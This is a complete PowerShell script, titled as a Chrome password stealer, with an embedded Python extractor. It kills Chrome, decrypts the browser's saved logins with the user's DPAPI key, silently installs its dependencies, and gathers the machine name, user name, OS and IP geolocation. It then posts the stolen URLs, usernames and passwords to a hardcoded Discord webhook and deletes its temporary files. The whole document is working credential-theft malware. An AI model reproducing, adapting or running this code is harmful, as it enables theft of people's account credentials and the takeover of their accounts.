# Chrome Password Stealer - Discord Only

$ErrorActionPreference = "Continue"

function Send-Discord {
    param($message)
    
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
        return $true
    } catch {
        return $false
    }
}

try {
    # Close Chrome to unlock database
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    
    # Create Python script
    $pythonScript = @'
import os, json, base64, sqlite3, shutil, tempfile
from Crypto.Cipher import AES
import win32crypt

def get_key():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt(password, key):
    try:
        iv = password[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password[15:])[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

key = get_key()
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
temp_db = os.path.join(tempfile.gettempdir(), f"chrome_{os.getpid()}.db")

shutil.copyfile(db_path, temp_db)

db = sqlite3.connect(temp_db)
cursor = db.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

results = []
for row in cursor.fetchall():
    url, username, enc_pass = row
    if enc_pass:
        password = decrypt(enc_pass, key)
        if password:
            results.append(f"{url}|||{username}|||{password}")

cursor.close()
db.close()
os.remove(temp_db)

print("|||".join(results))
'@
    
    $scriptPath = "$env:TEMP\chrome_extract_$(Get-Random).py"
    $pythonScript | Out-File $scriptPath -Encoding UTF8
    
    # Find Python
    $python = $null
    foreach ($cmd in @("python", "python3", "py")) {
        try {
            $ver = & $cmd --version 2>&1
            if ($ver -match "Python") {
                $python = $cmd
                break
            }
        } catch {}
    }
    
    if (-not $python) {
        Send-Discord "❌ Python not installed on target machine"
        exit
    }
    
    # Install dependencies silently
    & $python -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check 2>&1 | Out-Null
    
    # Run extractor
    $output = & $python $scriptPath 2>&1
    
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
    
    # Parse results
    $passwords = @()
    if ($output -and $output -notmatch "Traceback|Error") {
        $entries = $output -split "\|\|\|"
        
        for ($i = 0; $i -lt $entries.Count - 2; $i += 3) {
            $passwords += @{
                URL = $entries[$i]
                User = $entries[$i + 1]
                Pass = $entries[$i + 2]
            }
        }
    }
    
    # Get system info
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -TimeoutSec 5
        $ip = $ipInfo.query
        $city = $ipInfo.city
        $country = $ipInfo.country
    } catch {
        $ip = "Unknown"
        $city = "Unknown"
        $country = "Unknown"
    }
    
    # Format message
    if ($passwords.Count -eq 0) {
        $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:desktop: $os
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords:** No passwords found or extraction failed
Error: $output
"@
    } else {
        $passText = ""
        $max = [Math]::Min($passwords.Count, 15)
        
        for ($i = 0; $i -lt $max; $i++) {
            $p = $passwords[$i]
            $passText += "`n**$($p.URL)**`n``$($p.User)`` : ``$($p.Pass)```n"
        }
        
        if ($passwords.Count -gt 15) {
            $passText += "`n... +$($passwords.Count - 15) more passwords"
        }
        
        $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:desktop: $os
:globe_with_meridians: $ip - $city, $country

**🔐 Chrome Passwords ($($passwords.Count) found):**$passText
"@
    }
    
    # Send to Discord
    $sent = Send-Discord $message
    
    if ($sent) {
        Write-Host "SUCCESS! Sent $($passwords.Count) passwords to Discord" -ForegroundColor Green
    } else {
        Write-Host "Failed to send to Discord" -ForegroundColor Red
    }
    
} catch {
    Send-Discord "❌ Script error: $($_.Exception.Message)"
}

# Auto-close after 3 seconds
Start-Sleep -Seconds 3
